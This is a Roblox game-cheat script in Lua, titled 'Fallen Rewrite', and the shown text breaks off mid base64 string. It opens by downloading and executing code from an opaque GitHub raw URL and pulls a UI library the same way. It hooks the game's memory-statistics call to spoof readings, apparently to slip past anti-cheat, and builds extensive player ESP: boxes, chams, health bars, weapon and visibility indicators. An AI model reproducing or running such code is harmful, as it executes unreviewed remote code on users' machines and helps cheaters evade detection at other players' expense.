--<< Fallen Rewrite -<>
local Loader = loadstring(game:HttpGet("https://raw.githubusercontent.com/luckyext/1213123/refs/heads/main/123.txt",true))()
Loader:Initialize()
--queue_on_teleport([==[
    pcall(function()
        memorystats.restore("Gui")
    end)

    if not LPH_OBFUSCATED then
        LPH_NO_VIRTUALIZE = function(...) return ... end
    end
    LPH_NO_VIRTUALIZE(function()
        for Index, FallenGuardActor in next, getactors() do 
            run_on_actor(FallenGuardActor, [[
                local Stats = game:GetService("Stats");
                local Memory = Stats:GetTotalMemoryUsageMb() 
                local Namecall; Namecall = hookmetamethod(Stats, "__namecall", function(self, ...)
                    local Method = getnamecallmethod();
                    if Method == "GetTotalMemoryUsageMb" then
                        return Memory + math.random(-3, 3);
                    end;
                    return Namecall(self, ...)
                end);
            ]])
        end; 
    end)()

    local Workspace, RunService, UserInputService, Players, LocalPlayer, Camera, GuiService, Mouse, OsClock, Clone_Lighting, TweenService = cloneref(game:GetService("Workspace")), cloneref(game:GetService("RunService")), cloneref(game:GetService("UserInputService")), cloneref(game:GetService("Players")), cloneref(game:GetService("Players")).LocalPlayer, cloneref(game:GetService("Workspace").CurrentCamera), cloneref(game:GetService("GuiService")), cloneref(game:GetService("Players")).LocalPlayer:GetMouse(), os.clock(), cloneref(game:GetService("Lighting")), game:GetService("TweenService")


    -- << Load Library >>
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/BurnHubz/eclipse/main/menu.lua", true))()
        local weapon_icon = loadstring(game:HttpGet("https://github.com/BurnHubz/eclipse/raw/main/Images/Weapons",true))()
        --
        local Tabs = {
            Combat = Library:addTab("COMBAT", "http://www.roblox.com/asset/?id=15178561786"),
            Visuals = Library:addTab("VISUALS", "http://www.roblox.com/asset/?id=16855947732"),
            Miscellaneous = Library:addTab("MISC", "http://www.roblox.com/asset/?id=16856644248"), 
            Local = Library:addTab("LOCAL", "http://www.roblox.com/asset/?id=15178519346"), 
            Settings = Library:addTab("SETTINGS", "http://www.roblox.com/asset/?id=16856650102")
        }       

        --< Eclipse >--
        local default_fov = Camera.FieldOfView;
        local utilities = {
            aimbot = {
                target = nil
            },
            functions = {}
        }      

        if not LPH_OBFUSCATED then
            LPH_JIT = function(...) return ... end; LPH_JIT_MAX = function(...) return ... end; LPH_JIT_ULTRA = function(...) return ... end;
            LPH_NO_VIRTUALIZE = function(...) return ... end; LPH_NO_UPVALUES = function(f) return(function(...) return f(...) end) end;
            LPH_ENCSTR = function(...) return ... end; LPH_STRENC = function(...) return ... end; LPH_HOOK_FIX = function(...) return ... end;
            LPH_CRASH = function() return print(debug.traceback()) end
        end            

        --// Hitsounds
        local hit_sounds = {
            Neverlose = "rbxassetid://8726881116",Hitmarker = "rbxassetid://160432334",Gamesense = "rbxassetid://4817809188",Rust = "rbxassetid://1255040462",TF2 = "rbxassetid://2868331684",Minecraft = "rbxassetid://4018616850",Pop = "rbxassetid://198598793",Bruh = "rbxassetid://4275842574",Bamboo = "rbxassetid://3769434519",Steve = "rbxassetid://4965083997",["Among Us"] = "rbxassetid://5700183626",["CS:GO"] = "rbxassetid://6937353691",["Call of Duty"] = "rbxassetid://5952120301"
        }

        do
            local Snapline;
            do -- Drawings
                Snapline = Drawing.new("Line");Snapline.Visible, Snapline.Thickness = false, 1
            end
            
            do --ESP
            local Esp_Settings = {
                Enabled = true,
                Max_Distance = 100,
                Font_Size = 12,
                Display_Name = true,
                Team_Check = false,
                    Target = {
                        Enabled = false, Color = Color3.fromRGB(255, 0, 0), Player = nil
                    },
                    Box = {
                        Enabled = true, Outline = true, Color = Color3.fromRGB(255, 255, 255), Type = 'corner'
                    },
                    Chams = {
                        Enabled = true, Transparency = 0.8, Color = Color3.fromRGB(115, 100, 215), Breathe = true, VisibleCheck = false
                    },
                    FilledBox = {
                        Enabled = true, Color = Color3.fromRGB(0, 0, 0), Transparency = 0.5
                    },
                    Distance = {
                        Enabled = true, Color = Color3.fromRGB(255, 255, 255)
                    },
                    Name = {
                        Enabled = true, Color = Color3.fromRGB(255, 255, 255)
                    },
                    Flags = {
                        Enabled = true, Options = {"Visible", "Moving", "Jumping"},
                    },
                    ViewAngle = {
                        Enabled = true, Size = 5, Outline = false, Color = Color3.fromRGB(255, 255, 255)
                    },
                    HealthBar = {
                        Enabled = true, ColorFull = Color3.fromRGB(115, 100, 215), ColorEmpty = Color3.fromRGB(0, 0, 0), Text = true, TextColor = Color3.fromRGB(115, 100, 215), Thickness = 5,Options = "Gradient"
                    },
                    Tool = {
                        Enabled = true, Images = true, Images_Color = Color3.fromRGB(115, 100, 215), Color = Color3.fromRGB(255, 255, 255)
                    },
                    OffScreenArrows = {
                        Enabled = false, Outline = false, Radius = 500, Size = 15, Color = Color3.fromRGB(115, 100, 215), HPBars = false, Distance = false, Tool = false, Name = false, Box = false
                    },
                }          
                local gradient_healthbar = crypt.base64.decode("/9j/4AAQSkZJRgABAQAAAQABAAD/4gHYSUNDX1BST0ZJTEUAAQEAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAAABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADb/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAARCAAgACADAREAAhEBAxEB/8QAGgABAAIDAQAAAAAAAAAAAAAAAQACAwgJCv/EADwQAAEABQUKCwkAAAAAAAAAAAEAESExQQMEGFFxAgcTFyJVYWOBoQUIEhQzUmSRkrHRFSUyRIPBwuHw/8QAGgEBAQADAQEAAAAAAAAAAAAAAQACCQoIA//EAEURAAEBAwUIDAsJAAAAAAAAAAERACExAhdBUWEDFmRxgZKhogcIExgyNFRjwdHh8AQFBhIiJFNVYpGxJTNCQ1KDk+Lx/9oADAMBAAIRAxEAPwDqbig7IPAPROQO/fntZubQbWCk+Lsm4nok0Y+tgXoOyCsDkAbnxitqkr9+e1u1newR+zhj3JcVFQKJVUX2xQNVzUFgWuTAABapjVLHe1jEL9R7Y55dptbIbWAe7lcPy3Eq8Qh0kMi9AYzYW8hZ8g9C/QPG6mvhWEV0R7ozvYD7uJWkXMqFe70QEoyfPqIL1U16sh47h3igI7Snke++7j2mJJRqBgHaMahuibeyXNOJSQ9XyJNJyPMXwMHxmKuadWQ0ZdwfyI8/slfhdnfeu+GVaUDkIcTCmly5b2S58ikYjIk1LVjVC5EAgxismYLpvZhJO0ryu9dVqB8sLtzubKphRHugZG1luYA9SkVcARdSgVHf6zitmdU2ZrJLdlbwlffd+dd8MvoDI2s1zR/gNzySAj7CFJFaVVNo7SgDvaJZrRBu5PQc0mDOKfh+VHfK27yY3Aqn+bGp8H9NrSlBc5xW58ta17wtm9KaTBdTsZGwbgWoNEXHuXBKHjQDOA0nCi1fxOrYHOMWaTBdTqA0qzMbgYzNDhGBerjaxSgI+fDdaPXbVGtCaTBdTssHcszG4HJ/j/q3nQpQFvvEBccL/WtW9Nnc0x5M5P0HGioq0Kttrbj5jByMZhfo7XWs0oLrOIP1TV+i9KaaVybH6A6n6NBLUxg5GMw9TB40BavhLT0zlCD1bGpDYmK8WWzzBSa0FCigQZGwY/iYzD9EfibFShEeESFhfTCtzDAhyfWaTBYO4HY2Uxpd6oT+2S+P0XJY3//Z")
    
                do -- ESP
                    if (getgenv().Drawings) then
                        for _, drawing in pairs(getgenv().Drawings) do
                            drawing:Remove()
                        end
                    end
                    getgenv().Drawings = {}
                    
                    if (getgenv().Connections) then
                        for _, connection in pairs(getgenv().Connections) do
                            connection:Disconnect()
                        end
                    end
                    getgenv().Connections = {}
                    
                    local Functions;
                    do
                        Functions = {}
                        function Functions:GetBoundingBox(model)
                            local cframe, size = model:GetBoundingBox()
                            return cframe, size, cframe.Position
                        end
                    
                        function Functions:WorldToViewport(position, offsetx, offsety)
                            offsetx = offsetx or 0;offsety = offsety or 0
                            local screenPos, onScreen = Camera:WorldToViewportPoint(position)
                            return Vector2.new(screenPos.X + offsetx, screenPos.Y + offsety), onScreen, screenPos.Z
                        end
    
                        function Functions:GetPlayerTool(Character)
                            for _, value in pairs(Character:GetChildren()) do
                                if value.Name ~= "HolsterModel" and value:IsA("Model") and value.Name ~= "Hair" and (value:FindFirstChild("Detail") or value:FindFirstChild("Main") or value:FindFirstChild("Handle") or value:FindFirstChild("Attachments") or value:FindFirstChild("ArrowAttach") or value:FindFirstChild("Attach")) and value.PrimaryPart then
                                    return value.Name
                                end
                            end
                            return "hands"
                        end     
                        
                        function Functions:GetPlayerTool_Image(Character)
                            for _, value in pairs(Character:GetChildren()) do
                                if value.Name ~= "HolsterModel" and value:IsA("Model") and value.Name ~= "Hair" and (value:FindFirstChild("Detail") or value:FindFirstChild("Main") or value:FindFirstChild("Handle") or value:FindFirstChild("Attachments") or value:FindFirstChild("ArrowAttach") or value:FindFirstChild("Attach")) and value.PrimaryPart then
                                    return weapon_icon[value.Name] 
                                end
                            end
                            return nil
                        end     
                        
                        function Functions:TeamCheck(v)
                            if LocalPlayer.TeamColor == v.TeamColor then
                                return false
                            end
                            return true
                        end

                        function Functions:VisibleCheck(v)
                            local ray = Ray.new(workspace.CurrentCamera.CFrame.p, (v.Position - workspace.CurrentCamera.CFrame.p).Unit * 300)
                            local part, position = game:GetService("Workspace"):FindPartOnRayWithIgnoreList(ray, {game["Players"].LocalPlayer.Character, workspace.CurrentCamera}, false, true)
                            if part then
                                local hum = part.Parent:FindFirstChildOfClass("Humanoid")
                                if not hum then
                                    hum = part.Parent.Parent:FindFirstChildOfClass("Humanoid")
                                end
                                if hum and v and hum.Parent == v.Parent then
                                    local Vector, Visible = workspace.CurrentCamera:WorldToScreenPoint(v.Position)
                                    if Visible then
                                        return true
                                    end
                                end
                            end
                            return false
                        end
                    end
                    
                    local function AddPlayer(player)
                        if (player == LocalPlayer) then
                            return
                        end
                        -- creating ESP
                        local ESPDrawings = {
                            Text = {
                                Name = Drawing.new('Text'), Distance = Drawing.new('Text'), Tool = Drawing.new('Text'), Flags2 = Drawing.new('Text'), Flags3 = Drawing.new('Text'),
                            },
                            Images = {
                                Icons = Drawing.new('Image'), Visible = Drawing.new('Image'),
                            },
                            ViewAngle = {
                                Line = Drawing.new('Line'),
                            },
                            Box = {
                                LineTRV = Drawing.new('Line'), LineTRH = Drawing.new('Line'), LineTLV = Drawing.new('Line'), LineTLH = Drawing.new('Line'), 
                                LineBRV = Drawing.new('Line'), LineBRH = Drawing.new('Line'), LineBLV = Drawing.new('Line'), LineBLH = Drawing.new('Line'),
                            },
                            Outline = {
                                LineTRV = Drawing.new('Line'), LineTRH = Drawing.new('Line'), LineTLV = Drawing.new('Line'), LineTLH = Drawing.new('Line'),
                                LineBRV = Drawing.new('Line'), LineBRH = Drawing.new('Line'), LineBLV = Drawing.new('Line'), LineBLH = Drawing.new('Line'),
                            },
                            BoxFilled = {
                                Box = Drawing.new('Quad'),
                            },
                            HealthBar = {
                                Base = Drawing.new('Square'), Health = Drawing.new('Square'), Health2 = Drawing.new("Image"), Text = Drawing.new('Text'),
                            },
                            OffScreenArrows = {
                                Arrow = Drawing.new('Triangle'), Outline = Drawing.new('Triangle'),
                            },
                        }
                        local ESPChams = {
                            Chams = {
                                Body = Instance.new("BoxHandleAdornment"), Head = Instance.new("CylinderHandleAdornment")
                            },
                        }
                        local OSA, HB, OB, BO = ESPDrawings.OffScreenArrows, ESPDrawings.HealthBar, ESPDrawings.Outline, ESPDrawings.Box
                        local FB, VA, TE, IM = ESPDrawings.BoxFilled, ESPDrawings.ViewAngle, ESPDrawings.Text, ESPDrawings.Images
                        -- Drawings values
                        do
                            for index, value in pairs(ESPDrawings) do   
                                for _, drawing in pairs(value) do
                                    drawing.ZIndex, drawing.Visible = 2, false
                                    table.insert(getgenv().Drawings, drawing)
                                    if (index == 'Text') then
                                        drawing.Center, drawing.Outline = true, true
                                        drawing.Size = Esp_Settings.Font_Size
                                        drawing.Font = Esp_Settings.Font_Family
                                    elseif (index == 'Outline') then
                                        drawing.ZIndex, drawing.Thickness = 1, 3
                                        drawing.Color = Color3.new(0, 0, 0)
                                    elseif (index == 'Box') then
                                        drawing.Thickness = 1
                                    end
                                end 
                                HB.Base.Color = Color3.fromRGB(28, 28, 28)
                                HB.Base.ZIndex = 1
                                HB.Base.Filled, HB.Health.Filled, HB.Text.Outline, HB.Text.Center = true, true, true, true
                                HB.Text.Size, HB.Text.Font = Esp_Settings.Font_Size, Esp_Settings.Font_Family
                                OSA.Arrow.Filled, OSA.Outline.Filled = true, false
                                OSA.Outline.Color = Color3.new(0, 0, 0)
                                ESPDrawings.BoxFilled.Box.Filled = true
                                ESPDrawings.Text.Name.Text = player.Name
                            end
                        end                               
                        -- Drawings functions
                        local function HideDrawings()
                            for _, value in pairs(ESPDrawings) do
                                for _, drawing in pairs(value) do drawing.Visible = false end
                            end
                        end                                                                     
                        local function HideChams(chamsTable)
                            for _, value in pairs(chamsTable) do
                                for _, chams in pairs(value) do
                                    if chams:IsA("BoxHandleAdornment") or chams:IsA("CylinderHandleAdornment") then chams.Visible = false end
                                end
                            end
                        end           
                        local function DestroyDrawings()
                            for _, value in pairs(ESPDrawings) do
                                for _, drawing in pairs(value) do drawing:Remove() end
                            end
                        end
                        local function ToggleTable(_table, toggle)
                            for _, drawing in pairs(ESPDrawings[_table]) do drawing.Visible = toggle end
                        end
                        local function SetValue(_table, index, value)
                            for _, drawing in pairs(ESPDrawings[_table]) do drawing[index] = value end
                        end
                        -- Math functions
                        local function RotateVector2(vector2, rotation)
                            local cos, sin = math.cos(rotation), math.sin(rotation)
                            return Vector2.new(cos * vector2.X - sin * vector2.Y, sin * vector2.X + cos * vector2.Y)
                        end
                        local function CalculateOffset(vector2, position, size)
                            local cframe = CFrame.new(position, Camera.CFrame.Position)
                            local x, y = -size.X / 2, size.Y / 2
                            local tRight = Functions:WorldToViewport((cframe * CFrame.new(x, y, 0)).Position)
                            local bRight = Functions:WorldToViewport((cframe * CFrame.new(x, -y, 0)).Position)
                            return {
                                X = math.max(tRight.X - vector2.X, bRight.X - vector2.X),
                                Y = math.max(vector2.Y - tRight.Y, bRight.Y - vector2.Y)
                            }
                        end
                        local function CalculatePoints(offset, vector2)
                            local bps = {
                                B = Vector2.new(vector2.X, vector2.Y + offset.Y),T = Vector2.new(vector2.X, vector2.Y - offset.Y),
                                L = Vector2.new(vector2.X - offset.X, vector2.Y),R = Vector2.new(vector2.X + offset.X, vector2.Y),
                            }
                            return {
                                BR = Vector2.new(bps.R.X, bps.B.Y), TR = Vector2.new(bps.R.X, bps.T.Y),
                                TL = Vector2.new(bps.L.X, bps.T.Y), BL = Vector2.new(bps.L.X, bps.B.Y),
                                B = bps.B,T = bps.T,L = bps.L,R = bps.R,
                            }
                        end      
                        -- ESP functions
                        local function BoxESP(settings, info)
                            if (settings.Enabled) then
                                local points = info.Points
                                if (settings.Type == 'full') then
                                    ToggleTable('Box', false)
                                    ToggleTable('Outline', false)
                                    BO.LineTRV.Visible = true; BO.LineBRV.Visible = true; BO.LineTLV.Visible = true; BO.LineBLV.Visible = true;
                                    BO.LineTRV.To = points.TR
                                    BO.LineTRV.From = points.BR
                                    BO.LineBRV.To = points.BR
                                    BO.LineBRV.From = points.BL
                                    BO.LineBLV.To = points.BL
                                    BO.LineBLV.From = points.TL
                                    BO.LineTLV.To = points.TL
                                    BO.LineTLV.From = points.TR
                                    if (settings.Outline) then
                                        OB.LineTRV.Visible = true; OB.LineBRV.Visible = true; OB.LineTLV.Visible = true; OB.LineBLV.Visible = true;
                                        for index, drawing in pairs(OB) do
                                            if (drawing.Visible) then
                                                drawing.To = BO[index].To
                                                drawing.From = BO[index].From
                                            end
                                        end
                                    end
                                elseif (settings.Type == 'corner') then
                                    ToggleTable('Box', false)
                                    ToggleTable('Outline', false)
                                    BO.LineBRV.Visible = true; BO.LineBRH.Visible = true; BO.LineTRV.Visible = true; BO.LineTRH.Visible = true;BO.LineTLV.Visible = true; BO.LineTLH.Visible = true; BO.LineBLV.Visible = true; BO.LineBLH.Visible = true;
                                    BO.LineBRV.To = points.BR
                                    BO.LineBRH.To = points.BR
                                    BO.LineBRV.From = Vector2.new(points.BR.X, info.Vector2.Y + info.Offset.Y / 2.1)
                                    BO.LineBRH.From = Vector2.new(info.Vector2.X + info.Offset.X / 2.1, points.BR.Y)
                                    BO.LineTRV.To = points.TR
                                    BO.LineTRH.To = points.TR
                                    BO.LineTRV.From = Vector2.new(points.TR.X, info.Vector2.Y - info.Offset.Y / 2.1)
                                    BO.LineTRH.From = Vector2.new(info.Vector2.X + info.Offset.X / 2.1, points.TR.Y)
                                    BO.LineTLV.To = points.TL
                                    BO.LineTLH.To = points.TL
                                    BO.LineTLV.From = Vector2.new(points.TL.X, info.Vector2.Y - info.Offset.Y / 2.1)
                                    BO.LineTLH.From = Vector2.new(info.Vector2.X - info.Offset.X / 2.1, points.TL.Y)
                                    BO.LineBLV.To = points.BL
                                    BO.LineBLH.To = points.BL
                                    BO.LineBLV.From = Vector2.new(points.BL.X, info.Vector2.Y + info.Offset.Y / 2.1)
                                    BO.LineBLH.From = Vector2.new(info.Vector2.X - info.Offset.X / 2.1, points.BL.Y)
                                    if (settings.Outline) then
                                        ToggleTable('Outline', true)
                                        for index, drawing in pairs(OB) do
                                            drawing.To = BO[index].To
                                            drawing.From = BO[index].From
                                        end
                                    end
                                end
                                SetValue('Box', 'Color', (Esp_Settings.Target.Enabled and Esp_Settings.Target.Player == player and Esp_Settings.Target.Color) or Library.flags["Boxes_Accent"])
                                if Library.flags["TeamCheck"] then
                                    if not Functions:TeamCheck(player) then
                                        ToggleTable('Box', false)
                                        ToggleTable('Outline', false)
                                    else
                                        ToggleTable('Box', true)
                                        ToggleTable('Outline', true)
                                    end
                                end
                            else
                                ToggleTable('Box', false)
                                ToggleTable('Outline', false)
                            end
                        end

                        local function ChamsESP(settings, playerInfo)
                            if not Esp_Settings.Chams.Enabled then
                                HideChams(ESPChams)
                                return
                            end
                            if not playerInfo.Character or not playerInfo.Character:FindFirstChild("Head") then
                                return
                            end
                            for _, part in ipairs(playerInfo.Character:GetChildren()) do
                                if part:IsA("BasePart") and part.Transparency ~= 1 then
                                    local chams = part:FindFirstChild("Chams") or ((part == playerInfo.Character.Head) and Instance.new("CylinderHandleAdornment", part) or Instance.new("BoxHandleAdornment", part))
                                    chams.Name = "Chams"
                                    chams.ZIndex = 10
                                    chams.Adornee = part
                                    ESPChams.Chams[part.Name] = chams
                                    
                                    if part == playerInfo.Character.Head then
                                        chams.Radius, chams.Height, chams.CFrame = 0.65, 1.3, CFrame.Angles(math.rad(90), 0, 0)
                                    else
                                        chams.Size = part.Size
                                    end
                                    
                                    local breatheFactor = Esp_Settings.Chams.Breathe and math.sin(tick() * 2.25) * 0.5 + 0.5 or 1
                                    chams.Transparency = Library.flags["FillChams"] / 100 * breatheFactor
                                    chams.Color3 = (Esp_Settings.Target.Enabled and Esp_Settings.Target.Player == player and Esp_Settings.Target.Color) or Library.flags["ChamsFill_Accent"]
                                    chams.AlwaysOnTop = not Esp_Settings.Chams.VisibleCheck
                                    
                                    if Library.flags["TeamCheck"] then
                                        chams.Visible = Functions:TeamCheck(player)
                                    else
                                        chams.Visible = settings.Enabled
                                    end
                                end
                            end
                        end      

                        local function FilledBoxESP(settings, info)
                            local drawing = FB.Box
                            drawing.Visible = settings.Enabled
                            if (settings.Enabled) then
                                local points = info.Points
                                if Library.flags["TeamCheck"] then
                                    if not Functions:TeamCheck(player) then
                                        drawing.Visible = false
                                    else
                                        drawing.Visible = true
                                    end
                                else
                                    drawing.Visible = true
                                end
                                drawing.ZIndex = -1
                                drawing.Color = Library.flags["FilledBox_Accent"]
                                drawing.Transparency = settings.Transparency / 100
                                drawing.PointA = points.BR
                                drawing.PointB = points.TR
                                drawing.PointC = points.TL
                                drawing.PointD = points.BL
                            end
                        end

                        local function ViewAngleESP(settings, playerInfo)
                            local line = VA.Line
                            if not playerInfo or not Camera then
                                return
                            end
                            local head = playerInfo.Character and playerInfo.Character:WaitForChild("Head")
                            if not head or not head.Position or not head.CFrame then
                                return
                            end
                            if (settings.Enabled) then
                                local headPosition, headCFrame = head.Position, head.CFrame
                                local viewVector = (headCFrame * CFrame.new(0, 0, -Esp_Settings.ViewAngle.Size)).Position
                                local headViewport, viewViewport = Functions:WorldToViewport(headPosition), Functions:WorldToViewport(viewVector)
                            
                                line.From = Vector2.new(headViewport.X, headViewport.Y)
                                line.To = Vector2.new(viewViewport.X, viewViewport.Y)
                                line.Color = (Esp_Settings.Target.Enabled and Esp_Settings.Target.Player == player and Esp_Settings.Target.Color) or Esp_Settings.ViewAngle.Color
                                if Library.flags["TeamCheck"] then
                                    if not Functions:TeamCheck(player) then line.Visible = false else line.Visible = true end else line.Visible = true
                                end
                            else
                                line.Visible = false
                            end
                        end       

                        local function DistanceESP(settings, info)
                            local drawing = TE.Distance
                            drawing.Visible = settings.Enabled
                            if (settings.Enabled) then
                                local offset = 1
                                if IM.Icons.Visible then
                                    offset = offset + 23.5
                                elseif TE.Tool.Visible then
                                    offset = offset + TE.Tool.TextBounds.Y
                                end
                                if Library.flags["TeamCheck"] then if not Functions:TeamCheck(player) then drawing.Visible = false else drawing.Visible = true end
                                else
                                    drawing.Visible = true
                                end
                                drawing.Color = (Esp_Settings.Target.Enabled and Esp_Settings.Target.Player == player and Esp_Settings.Target.Color) or Library.flags["Distance_Accent"]
    
                                local playerHRP = player.Character:FindFirstChild("HumanoidRootPart")
                                local localPlayerHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                                
                                if playerHRP and localPlayerHRP then
                                    local distance = tostring(math.floor((playerHRP.Position - localPlayerHRP.Position).Magnitude / 3.5714285714))
                                    drawing.Text = '[' .. distance .. ']'
                                    drawing.Position = info.Points.B + Vector2.new(0, offset)
                                    drawing.Font = Esp_Settings.Font_Family
                                    drawing.Size = Esp_Settings.Font_Size
                                end    
                            end
                        end

                        local function ToolESP(settings, info)
                            local drawing, icons = TE.Tool, IM.Icons
                            local playerTool, toolImage = Functions:GetPlayerTool(player.Character), Functions:GetPlayerTool_Image(player.Character)
                            local teamCheck = not Library.flags["TeamCheck"] or Functions:TeamCheck(player)
                        
                            if settings.Enabled and playerTool then
                                drawing.Text = tostring(playerTool)
                                drawing.Color = (Esp_Settings.Target.Enabled and Esp_Settings.Target.Player == player and Esp_Settings.Target.Color) or Library.flags["Weapon_Accent"]
                                drawing.Position = info.Points.B + Vector2.new(0, 1)
                                drawing.Font = Esp_Settings.Font_Family
                                drawing.Size = Esp_Settings.Font_Size
  
                                if teamCheck then
                                    drawing.Visible = true
                                    if toolImage and Library.flags["WeaponIcon"] then
                                        icons.Data = toolImage
                                        icons.Position = info.Points.B - Vector2.new(17, -2)
                                        icons.Size = Vector2.new(40, 40) - Vector2.new(Esp_Settings.Font_Size, Esp_Settings.Font_Size) 
                                        icons.Color = Library.flags["Weapon_Icon_Accent"]
                                        icons.Visible = true
                                    else
                                        icons.Visible = false
                                    end
                                else
                                    drawing.Visible = false
                                    icons.Visible = false
                                end
                            else
                                drawing.Visible = false
                                icons.Visible = false
                            end
                        end           

                        local function NameESP(settings, info)
                            local drawing = TE.Name 
                            drawing.Visible = settings.Enabled
                            if settings.Enabled then
                                if Library.flags["DisplayNames"] then
                                    drawing.Text = player.DisplayName
                                else
                                    drawing.Text = player.Name
                                end
                                if Library.flags["TeamCheck"] then
                                    if not Functions:TeamCheck(player) then
                                        drawing.Visible = false
                                    else
                                        drawing.Visible = true
                                    end
                                else
                                    drawing.Visible = true
                                end
                                drawing.Color = (Esp_Settings.Target.Enabled and Esp_Settings.Target.Player == player and Esp_Settings.Target.Color) or Esp_Settings.Name.Color
                                drawing.Position = info.Points.T + Vector2.new(0, -12)
                                drawing.Font = Esp_Settings.Font_Family
                                drawing.Size = Esp_Settings.Font_Size
                            end
                        end

                        local function flagsESP(settings, info)
                            local vischeck, drawing2, drawing3 = IM.Visible, TE.Flags2, TE.Flags3
                            local is_visible = false 
                            local is_moving, is_jumping = false, false
                            if settings.Enabled and Esp_Settings.Flags.Enabled then
                                if player.Character:FindFirstChild("Head") then
                                    is_visible = Functions:VisibleCheck(player.Character.Head) or Functions:VisibleCheck(player.Character.HumanoidRootPart)
                                end
                                if is_visible and table.find(Esp_Settings.Flags.Options, "Visible") then
                                    if not vischeck then
                                        vischeck = IM.Icons
                                    end
                                    vischeck.Color = Color3.fromRGB(75, 150, 75)
                                    vischeck.Position = info.Points.T - Vector2.new(11, 32)
                                    vischeck.Size = Vector2.new(32, 32) - Vector2.new(Esp_Settings.Font_Size, Esp_Settings.Font_Size) 
                                    vischeck.Visible = true 
                                    vischeck.Data = crypt.base64.decode("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